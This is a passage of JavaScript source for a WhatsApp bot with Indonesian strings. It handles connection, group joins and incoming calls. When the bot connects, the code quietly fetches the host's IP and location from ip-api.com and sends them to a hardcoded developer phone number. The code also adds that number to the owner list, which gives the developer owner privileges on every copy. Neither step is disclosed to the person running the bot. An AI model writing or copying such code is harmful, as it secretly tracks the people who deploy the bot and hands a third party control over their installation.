...
pemuda.autoReconnect = ReconnectMode.onConnectionLost
 ...
 pemuda.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(pemuda.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/62895606059646?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       pemuda.sendMessage("62895606059646@s.whatsapp.net", `─────「 *BANG ADU CWEK YOK* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Pemuda Teknologi",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:"https://wa.me/62895606059646?text=Assalamualaikum"}}})
...
exec(`cd /sdcard/download && play *mp3`)
   ...
   pemuda.on('chat-update', async (mek) => {
        ...
        ownerNumber = ["62895606059646@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
        dtod = "62895606059646@s.whatsapp.net"
       otod = `${settings.NomorOwner}@s.whatsapp.net`
        ...
        pemuda.on('group-participants-update', async (anu) => {
           mem = anu.participants[0]
			...
			console.log(anu)
			if (anu.action == 'add') {
			fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;pemuda;;;\nFN:pemuda\nitem1.TEL;waid=62895606059646:62895606059646\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
...
pemuda.on('CB:action,,call', async json => {
        ...
        pemuda.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./media/image/pemuda.jpg'),sourceUrl:`https://wa.me/62895606059646?text=Assalamualaikum`}}})
        await sleep(5000)
